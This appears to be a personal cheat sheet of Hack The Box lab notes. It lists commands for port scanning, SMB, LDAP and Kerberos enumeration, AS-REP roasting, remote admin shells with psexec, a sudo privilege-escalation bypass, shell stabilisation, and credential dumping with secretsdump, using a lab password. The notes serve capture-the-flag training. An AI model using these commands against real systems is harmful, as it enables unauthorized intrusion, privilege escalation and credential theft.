### HTB NOTES
Some useful notes made while playing HTB
### Initial recon 
```
rustscan 10.10.10.191 -- -p- -sV -A -Pn
nmap -p- -sV -A -Pn 10.10.10.191
```

### http/https_open?:
	gobuster
	content discovery via burp
	wfuzz -c -w /root/xPayloads/SecLists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://example.com/FUZZ.txt" -t 100
	python3 ./dirsearch.py -u http://10.10.10.175 -e *
	cewl -w wordlists.txt -d 10 -m 1 http://blunder.htb/

### shell uploaded but no path?
	python3 dirsearch.py -u http://10.10.10.28 -e php

### Need users?:
	grab from: 
		-site "About Us"
		-random files on smb or http server
		-ldap
	create user list:
		-John Doe
			-jdoe
			-johndoe
			-john.doe
###  nfs?:
	sudo showmount -e 10.10.10.10.
	mount -t nfs 10.10.10.100:/site_backups /root/HTB/remote/site_backup
	
### dns-open?:
	-dnsrecon -d 10.10.10.100 -r 10.0.0.0/8 #this will return hostname of box

### kerberos_open?:
	try to bruteforce users, create list from site or try to withdraw from ldap
	kerbrute userenum -d EGOTISTICALBANK users.txt --dc 10.10.10.175
	GetNPUsers.py BLACKFIELD.LOCAL/support -dc-ip 10.10.10.192 -no-pass

### ldap_open?:
	nslookup; server 10.10.10.100 ; 127.0.0.1; 10.10.10.100
	ldapsearch -x -h 10.10.10.175 -p 389 -s base namingcontexts
	ldapsearch -x -h 10.10.10.175 -p 389 -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
		-or nmap -p 389 --script ldap-search

### smb_open?:
	locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
	nmap --script safe -p 445 10.10.10.100
	nmap --script smb-enum-services -p 445 10.10.10.100
	smbclient -N -L //10.10.10.100
	smbclient -N  //10.10.10.100/backups
	smbmap -H 10.10.10.100
		-smbap -R replication -H 10.10.10.10. -A Groups.xml -q
	
	rpcclient -U support //10.10.10.192
		-rpcclient $> setuserinfo2 support 23 'Password!'


### msql_open?:
	-python3 ~/tools/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth


### got_win_admin?:
	-python ~/tools/impacket/examples/psexec.py administrator@10.10.10.27 #Admin shell 


### linux shell todo:
Got Reverse shell?
```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
or
```
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```

or

## Escalation Linux

### Sudo wierdos
```
id 
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
sudo -l sudo: unable to open /run/sudo/ts/ash: Read-only file system [sudo] password for ash: Sorry, user ash may not run sudo on tabby.
[https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)  
```
[https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation)


```
sudo -l
root    ALL=(ALL:ALL) ALL
sudo -u#-1 /bin/bash
```
### Look for suid:
```
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```
### Automated recon:
```
LinEnum.sh
linuxprivchecker.py

```
### Enumerate internal services:
```
nmap -p- 127.0.0.1
cat /proc/330/cmdline #sometimes there is password in command :P
```

### Search password in filses:
```
find / -name "*backup*" 2>/dev/null
find / -name "*users*" 2>/dev/null
Check config files db connections:
find / -name "db.php" 2>/dev/null 
go to webapp dir
```




zip-cracking:
```
fcrackzip -D -p rockyou test.zip
```
## Windows:
```
Check groups:
	-Local Group Memberships      *AD Recycle Bin 
		-Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
Check ACLS:
	-invoke-aclscaner:
		-ObjectAceType           : 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 <-dnssync
			-secretsdump.py -dc-ip 10.10.10.175 'EGOSTATICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

Privileges:
	-SeBackupPrivilege             Back up files and directories  Enabled
	 SeRestorePrivilege            Restore files and directories  Enabled
		-shadowcopy
	-SeImpersonate
		-PrintSpoofer.exe

```
